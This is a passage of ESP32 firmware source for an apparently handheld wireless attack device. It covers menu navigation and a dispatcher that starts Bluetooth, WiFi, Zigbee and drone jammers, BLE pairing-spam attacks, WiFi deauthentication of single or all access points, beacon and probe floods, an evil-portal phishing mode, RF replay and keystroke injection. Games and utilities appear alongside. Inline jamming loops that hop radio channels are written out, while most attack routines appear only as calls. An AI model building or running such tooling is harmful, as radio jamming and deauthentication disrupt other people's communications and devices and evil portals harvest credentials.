      selectedMain = static_cast<MainMenuItem>(NUM_MAIN_ITEMS - 1);
      firstVisibleMain = NUM_MAIN_ITEMS - 4;
    } else {
      selectedMain = static_cast<MainMenuItem>(selectedMain - 1);
      if (selectedMain < firstVisibleMain) firstVisibleMain = selectedMain;
    }
    drawMainMenu();
  } else if (downPressed()) {
    selectedMain = static_cast<MainMenuItem>((selectedMain + 1) % NUM_MAIN_ITEMS);
    if (selectedMain == 0) firstVisibleMain = 0;
    else if (selectedMain >= firstVisibleMain + 4) firstVisibleMain = selectedMain - 3;
    drawMainMenu();
  } else if (selPressed()) {
    switch (selectedMain) {
      case MENU_JAMMERS:  currentSubMenu = &subJammers;  currentState = STATE_SUBMENU_JAMMERS;  break;
      case MENU_ANALYZERS:currentSubMenu = &subAnalyzers;currentState = STATE_SUBMENU_ANALYZERS;break;
      case MENU_ATTACKS:  currentSubMenu = &subAttacks;  currentState = STATE_SUBMENU_ATTACKS;  break;
      case MENU_TOOLS:    currentSubMenu = &subTools;    currentState = STATE_SUBMENU_TOOLS;    break;
      case MENU_GAMES:    currentSubMenu = &subGames;    currentState = STATE_SUBMENU_GAMES;    break;
      case MENU_SETTINGS: currentSubMenu = &subSettings; currentState = STATE_SUBMENU_SETTINGS; break;
      case MENU_HELP:     showHelp(); currentState = STATE_MENU; break;
      case MENU_CLI:      runCLI();   currentState = STATE_MENU; break;
      case MENU_LOCK:     runLock();  currentState = STATE_MENU; break;
      default: break;
    }
    subFirstVisible = 0;
    subSelectedIndex = 0;
    if (currentState != STATE_MENU) drawSubMenu();
  }
}

void handleSubMenu() {
  if (!currentSubMenu) { currentState = STATE_MENU; return; }
  int total = currentSubMenu->items.size();
  if (upPressed()) {
    if (subSelectedIndex == 0) {
      subSelectedIndex = total - 1;
      subFirstVisible = max(0, total - 4);
    } else {
      subSelectedIndex--;
      if (subSelectedIndex < subFirstVisible) subFirstVisible = subSelectedIndex;
    }
    drawSubMenu();
  } else if (downPressed()) {
    subSelectedIndex = (subSelectedIndex + 1) % total;
    if (subSelectedIndex >= subFirstVisible + 4) subFirstVisible = subSelectedIndex - 3;
    drawSubMenu();
  } else if (selPressed()) {
    AppState target = currentSubMenu->items[subSelectedIndex].targetState;
    currentSubMenu = nullptr;
    executeState(target);
  }
}

// ============================================================
// STATE DISPATCHER
// ============================================================
void executeState(AppState st) {
  switch (st) {
    case STATE_BT_JAM:
      displayInfo("BT Jam", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { btJam(); yield(); }
      initRadios(); break;
    case STATE_DRONE_JAM:
      displayInfo("Drone Jam", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { droneJam(); yield(); }
      initRadios(); break;
    case STATE_WIFI_JAM:
      displayInfo("WiFi Jam", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { wifiJam(); yield(); }
      initRadios(); break;
    case STATE_MULTI_JAM:
      displayInfo("Multi Jam", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { multiJam(); yield(); }
      initRadios(); break;
    case STATE_SWEEP_JAM:
      displayInfo("Sweep", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { sweepJam(); yield(); }
      initRadios(); break;
    case STATE_CHANNEL_RANGE: {
      int lo = 10, hi = 70;
      displayInfo("Ch Range", "Lo:" + String(lo) + " Hi:" + String(hi), "SEL stop");
      initRadios();
      while (!selPressed()) { channelRangeJam(lo, hi); yield(); }
      initRadios(); break;
    }
    case STATE_CW_JAMMER: {
      int ch = 40;
      initRadios();
      displayInfo("CW Jammer", "Ch:" + String(ch), "UP/DN chg SEL stop");
      cwJammer(ch);
      while (!selPressed()) {
        if (upPressed()) { ch = (ch + 5) % 125; cwJammer(ch); }
        if (downPressed()) { ch = (ch + 120) % 125; cwJammer(ch); }
        yield();
      }
      initRadios(); break;
    }
    case STATE_ZIGBEE_JAM:
      displayInfo("Zigbee", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { zigbeeJam(); yield(); }
      initRadios(); break;
    case STATE_BLE_TARGET_JAM:
      displayInfo("BLE Targ.Jam", "Running", "SEL stop"); initRadios();
      while (!selPressed()) {
        if (radio1Active) radio.setChannel(2);  if (radio2Active) radio2.setChannel(2);  delayMicroseconds(80);
        if (radio1Active) radio.setChannel(26); if (radio2Active) radio2.setChannel(26); delayMicroseconds(80);
        if (radio1Active) radio.setChannel(80); if (radio2Active) radio2.setChannel(80); delayMicroseconds(80);
        yield();
      }
      initRadios(); break;
    case STATE_CUSTOM_HOPPER: {
      int lo = 0, hi = 125;
      displayInfo("Hopper", "Range 0-125", "SEL stop"); initRadios();
      while (!selPressed()) {
        int r = random(lo, hi + 1);
        if (radio1Active) radio.setChannel(r);
        if (radio2Active) radio2.setChannel(r);
        delayMicroseconds(60);
        yield();
      }
      initRadios(); break;
    }
    case STATE_NOISE_GEN:
      displayInfo("NoiseGen", "Running", "SEL stop"); initRadios();
      while (!selPressed()) { noiseGen(); yield(); }
      initRadios(); break;

    case STATE_SPECTRUM_WIFI: runWiFiSpectrum(); break;
    case STATE_SPECTRUM_BLE:  runBLESpectrum();  break;
    case STATE_RF_ANALYZER:   runRFAnalyzer();   break;
    case STATE_WIFI_ANALYZER: runWiFiAnalyzer(); break;
    case STATE_PACKET_COUNTER:runPacketCounter();break;
    case STATE_WIFI_SNIFFER:  runWiFiSniffer();  break;
    case STATE_SIGNAL_METER:  runSignalMeter();  break;

    case STATE_BLE_SPAM:        runBLESpam();       break;
    case STATE_APPLE_JUICE:     runAppleJuice();    break;
    case STATE_SWIFT_PAIR:      runSwiftPair();     break;
    case STATE_FAST_PAIR:       runFastPair();      break;
    case STATE_RICKROLL_BEACON: runRickroll();      break;
    case STATE_BLE_BADUSB:      runBLEBadUSB();     break;
    case STATE_WIFI_DEAUTH: {
      int opt = 0;
      while (!selPressed()) {
        display.clearDisplay();
        drawHeader("Deauth Options");
        display.setCursor(0, 16); display.println(opt == 0 ? "> Single AP" : "  Single AP");
        display.setCursor(0, 28); display.println(opt == 1 ? "> All APs"   : "  All APs");
        display.display();
        if (upPressed() || downPressed()) opt = (opt == 0) ? 1 : 0;
        yield();
      }
      if (opt == 0) runWiFiDeauth(); else runWiFiDeauthAll();
      break;
    }
    case STATE_WIFI_BEACON_FLOOD: runWiFiBeaconFlood(); break;
    case STATE_PROBE_FLOOD:       runProbeFlood();      break;
    case STATE_EVIL_PORTAL:       runEvilPortal();      break;

    case STATE_ROGUE_AP_DETECT:  runRogueAPDetect();  break;
    case STATE_NRF24_INJECTOR:   runNRF24Injector();  break;
    case STATE_DEAUTH_DETECT:    runDeauthDetect();   break;
    case STATE_WIDS:             runWIDS();           break;
    case STATE_BLE_SCANNER:      runBLEScanner();     break;
    case STATE_BLE_GATT_EXPLORER:runBLEGATTExplorer();break;
    case STATE_BLE_TRACKER:      runBLETracker();     break;
    case STATE_MOUSE_SNIFFER:    runMouseSniffer();   break;
    case STATE_RF_REPEATER:      runRFRepeater();     break;
    case STATE_RF_REPLAY:        runRFReplay();       break;
    case STATE_RF_OSCILLOSCOPE:  runRFOscilloscope(); break;
    case STATE_DUCKY_INJECTOR:   runDuckyInjector();  break;
    case STATE_TEST_RADIOS:      runTestRadios();     break;
    case STATE_SYSTEM_INFO:      runSystemInfo();     break;

    case STATE_DOOM_GAME:    runDOOM();       break;
    case STATE_DINO_GAME:    runDinoGame();   break;
    case STATE_FLAPPY_GAME:  runFlappyGame(); break;
    case STATE_SNAKE_GAME:   runSnakeGame();  break;
    case STATE_TICTACTOE:    runTicTacToe();  break;
    case STATE_PONG:         runPong();       break;
    case STATE_HUNT_GAME:    runHuntGame();   break;
    case STATE_SIMON_GAME:   runSimonGame();  break;
    case STATE_MEMORY_GAME:  runMemoryGame(); break;
    case STATE_INVADERS:     runInvaders();   break;

    case STATE_CALCULATOR:    runCalculator();  break;
    case STATE_RESISTOR_CALC: runResistorCalc();break;
    case STATE_WIFI_MONITOR:  runWiFiMonitor(); break;
    case STATE_WEB_DASHBOARD: runWebDashboard();break;
    case STATE_CLI:           runCLI();         break;
    case STATE_SETTINGS:      showSettings();   break;
    case STATE_HELP:          showHelp();       break;
    case STATE_LOCK:          runLock();        break;
    case STATE_MENU: break;
    default: break;
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ============================================================
// SETUP & LOOP
// ============================================================
void setup() {
  Serial.begin(115200);
  safeDelay(600);
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Wire.begin(SDA_PIN, SCL_PIN);
  if (!display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS)) {
    for (;;) yield();
  }
  display.dim(false);
  u8g2_for_adafruit_gfx.begin(display);

  prefs.begin("utsjam", false);
  brightness = prefs.getUChar("bright", 255);
  if (brightness < 10) brightness = 255;
  setBrightness(brightness);

  splashScreen();
  safeDelay(2200);
  drawMainMenu();
}

void loop() {
  switch (currentState) {
    case STATE_MENU: handleMainMenu(); break;
    case STATE_SUBMENU_JAMMERS:
    case STATE_SUBMENU_ANALYZERS:
    case STATE_SUBMENU_ATTACKS:
    case STATE_SUBMENU_TOOLS:
    case STATE_SUBMENU_GAMES:
    case STATE_SUBMENU_SETTINGS:
      handleSubMenu(); break;
    default:
      currentState = STATE_MENU;
      drawMainMenu();
      break;
  }
  yield();
}
